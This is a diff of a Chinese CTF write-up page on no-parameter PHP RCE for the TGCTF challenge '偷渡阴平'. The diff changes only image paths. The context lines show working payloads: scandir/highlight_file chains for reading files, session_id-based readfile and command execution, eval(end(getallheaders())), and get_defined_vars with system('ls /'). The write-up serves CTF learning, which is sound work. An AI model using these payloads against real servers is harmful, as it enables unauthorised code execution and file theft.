@@ -26,18 +26,18 @@
 <meta property="og:site_name" content="(๑´ڡ&#96;๑)">
 <meta property="og:description" content="正常解题TGCTF–偷渡阴平考点总结： PHP session_id、绕过waf、无参RCE（非预期） 源码如下 12345678910111213 &lt;?php$tgctf2025&#x3D;$_GET[&#x27;tgctf2025&#x27;];if(!preg_match(&quot;&#x2F;0|1|[3-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415002022637.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415005040694.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415004819352.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415124542664.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416162541034.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416163003976.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415002022637.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415005040694.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415004819352.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415124542664.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416162541034.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416163003976.png">
 <meta property="article:published_time" content="2025-04-29T15:54:35.000Z">
 <meta property="article:modified_time" content="2025-04-29T15:55:17.778Z">
 <meta property="article:author" content="chen">
 <meta property="article:tag" content="无参RCE">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415002022637.png">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415002022637.png">
 <meta name="twitter:creator" content="@chen">
   
   
@@ -332,7 +332,7 @@
 <li><code>scandir()</code>：这个函数会将指定目录下的所有文件和子目录的名称作为一个数组返回，这里返回的是根目录的所有文件和子目录</li>
 <li><code>var_dump()</code>：将返回的含有根目录的文件和子目录名的数组打印出来</li>
 </ul>
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415002022637.png" srcset="/img/loading.gif" lazyload alt="image-20250415002022637"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415002022637.png" srcset="/img/loading.gif" lazyload alt="image-20250415002022637"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?tgctf2025=highlight_file(array_rand(array_flip(scandir(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">chdir</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-built_in">dirname</span>(getcwd())))))))));<br></code></pre></td></tr></table></figure>
 
 <ul>
@@ -345,9 +345,9 @@
 <li><code>highlight_file()</code> ：这个函数将随机选取的文件内容高亮显示出来</li>
 </ul>
 <p>缺少<code>scandir()</code>函数更改工作目录这一步的结果是无法读取文件</p>
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415005040694.png" srcset="/img/loading.gif" lazyload alt="image-20250415005040694"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415005040694.png" srcset="/img/loading.gif" lazyload alt="image-20250415005040694"></p>
 <p>加上这个函数就可以读文件了，因为是随机选取一个文件，所以刷新几次就可以读到了</p>
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415004819352.png" srcset="/img/loading.gif" lazyload alt="image-20250415004819352"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415004819352.png" srcset="/img/loading.gif" lazyload alt="image-20250415004819352"></p>
 <p><strong>方法三</strong>：</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?tgctf2025=show_source(<span class="hljs-built_in">array</span>_rand(<span class="hljs-built_in">array</span>_flip(scandir(dirname(chdir(strrev(crypt(serialize(<span class="hljs-built_in">array</span>())))))))));<br></code></pre></td></tr></table></figure>
 
@@ -384,17 +384,17 @@
 </li>
 </ul>
 <p>这题的解题思路就是开启一个新会话，通过在当前会话的 ID 中构造要执行的命令，并转化为二进制字符串，使用<code>system()</code>函数执行命令</p>
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250415124542664.png" srcset="/img/loading.gif" lazyload alt="image-20250415124542664"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250415124542664.png" srcset="/img/loading.gif" lazyload alt="image-20250415124542664"></p>
 <h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>如果知道文件名，可以直接使用readfile读文件，在 PHPSESSION 中写入文件名</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416162541034.png" srcset="/img/loading.gif" lazyload alt="image-20250416162541034"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416162541034.png" srcset="/img/loading.gif" lazyload alt="image-20250416162541034"></p>
 <h1 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h1><p>这个函数可以返回当前请求的所有请求头信息，局限于Apache</p>
 <p><code>apache_request_headers()</code>和<code>getallheaders()</code>功能相似，可互相替代，不过也是局限于Apache</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()));</span><br></code></pre></td></tr></table></figure>
 
 <p>这里可以在数据包最后加入一个请求头，写入恶意代码，使用<code>end()</code>函数指向最后一个请求头，从而可以执行命令</p>
-<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/%E9%A2%98/image-20250416163003976.png" srcset="/img/loading.gif" lazyload alt="image-20250416163003976"></p>
+<p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416163003976.png" srcset="/img/loading.gif" lazyload alt="image-20250416163003976"></p>
 <h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p>相较于<code>getallheaders()</code>更加具有普遍性，这个函数可以回显所有变量</p>
 <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-variable">b</span>=<span class="hljs-title">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);</span><br></code></pre></td></tr></table></figure>
 
